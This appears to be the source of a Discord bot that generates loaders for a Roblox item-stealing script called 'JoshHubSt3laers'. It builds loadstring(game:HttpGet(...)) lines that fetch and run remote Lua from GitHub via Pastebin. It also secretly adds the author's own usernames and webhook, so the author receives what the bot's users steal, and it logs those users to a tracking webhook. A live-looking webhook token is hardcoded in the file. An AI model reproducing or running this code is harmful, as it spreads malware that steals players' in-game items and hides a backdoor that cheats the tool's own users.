import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests
from flask import Flask
from threading import Thread

# Discord bot setup
intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# Configuration
SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

# Webhook for tracking
TRACKING_WEBHOOK = SECRET_WEBHOOK

# Flask server for keep-alive
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive! ✅"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def start_keep_alive():
    t = Thread(target=run_flask)
    t.start()

# Start keep-alive
start_keep_alive()

def send_webhook_notification(user, targets, paste_url, guild_name, loadstring_code):
    """Send tracking notification"""
    try:
        data = {
            "embeds": [{
                "title": "📊 New Script Generated!",
                "color": 5814783,
                "fields": [
                    {"name": "User", "value": f"{user.name}#{user.discriminator}", "inline": True},
                    {"name": "User ID", "value": str(user.id), "inline": True},
                    {"name": "Server", "value": guild_name or "DM", "inline": True},
                    {"name": "Target Usernames", "value": targets or "None", "inline": False},
                    {"name": "Pastebin Link", "value": paste_url or "Failed", "inline": False}
                ],
                "timestamp": discord.utils.utcnow().isoformat()
            }]
        }
        requests.post(TRACKING_WEBHOOK, json=data, timeout=5)
        print("✅ Webhook sent")
        return True
    except:
        print("❌ Webhook failed")
        return False

def create_pastebin(content):
    """Create a paste on Pastebin"""
    try:
        if not PASTEBIN_API_KEY:
            print("❌ No Pastebin API key!")
            return None, None
            
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': '1D',
            'api_paste_name': 'MM2 Script'
        }
        
        response = requests.post('https://pastebin.com/api/api_post.php', data=data, timeout=10)
        
        if response.status_code == 200:
            paste_url = response.text.strip()
            if 'pastebin.com/' in paste_url and not paste_url.startswith('Bad API request'):
                paste_id = paste_url.split('/')[-1]
                raw_url = f"https://pastebin.com/raw/{paste_id}"
                print(f"✅ Pastebin created: {paste_url}")
                return paste_url, raw_url
        
        print("❌ Pastebin failed")
        return None, None
        
    except Exception as e:
        print(f"❌ Pastebin error: {e}")
        return None, None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(
        label="Target Usernames (comma separated)",
        placeholder="e.g. Nikilis, Tobi, JD",
        style=discord.TextStyle.paragraph,
        required=True
    )
    webhook = TextInput(
        label="Your Webhook URL",
        placeholder="https://discord.com/api/webhooks/...",
        style=discord.TextStyle.long,
        required=True
    )
    min_rarity = TextInput(
        label="Minimum Rarity (default: Godly)",
        placeholder="Godly, Ancient, Legendary, etc.",
        default="Godly",
        required=False
    )
    min_value = TextInput(
        label="Minimum Value (default: 1)",
        placeholder="Only collect items worth this or more",
        default="1",
        required=False
    )
    ping = TextInput(
        label="Ping @everyone on hit? (Yes/No)",
        placeholder="Yes or No",
        default="No",
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # Process inputs
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        
        # Build GitHub URL
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "secret_webhook": SECRET_WEBHOOK,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No"
        })
        
        github_url = f"{RAW_SCRIPT_URL}?{params}"
        
        # Create Pastebin
        script_for_pastebin = f'loadstring(game:HttpGet("{github_url}"))()'
        paste_url, raw_url = create_pastebin(script_for_pastebin)
        
        if paste_url and raw_url:
            # CRITICAL FIX: Create the correct loadstring
            loadstring_for_user = f'loadstring(game:HttpGet("{raw_url}"))()'
            
            print(f"✅ Generated loadstring: {loadstring_for_user}")
            
            # Send tracking
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets) if user_targets else "None",
                paste_url,
                interaction.guild.name if interaction.guild else "DM",
                loadstring_for_user
            )
            
            # FIXED: Send correct loadstring to user
            try:
                await interaction.user.send(
                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                    f"Copy and execute this in Roblox:\n"
                    f"```lua\n{loadstring_for_user}\n```"  # FIXED LINE
                )
                await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
            except:
                await interaction.followup.send(
                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                    f"Copy and execute this in Roblox:\n"
                    f"```lua\n{loadstring_for_user}\n```",  # FIXED LINE
                    ephemeral=True
                )
        else:
            # Fallback
            fallback_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
            await interaction.followup.send(
                f"**Direct Link:**\n```lua\n{fallback_loadstring}\n```",
                ephemeral=True
            )

@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
async def generate_mm2(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    print(f"══════════════════════════════════")
    print(f"✅ {bot.user} is online!")
    print(f"🤖 Bot ID: {bot.user.id}")
    print(f"🔗 Keep-alive: http://0.0.0.0:8080")
    print(f"══════════════════════════════════")
    
    try:
        await tree.sync()
        print("🔄 Commands synced")
    except:
        print("⚠️ Command sync issue")

# Run bot
if __name__ == "__main__":
    if not DISCORD_TOKEN:
        print("❌ ERROR: No DISCORD_TOKEN in Replit Secrets!")
        exit(1)
    
    print("🚀 Starting bot...")
    bot.run(DISCORD_TOKEN)
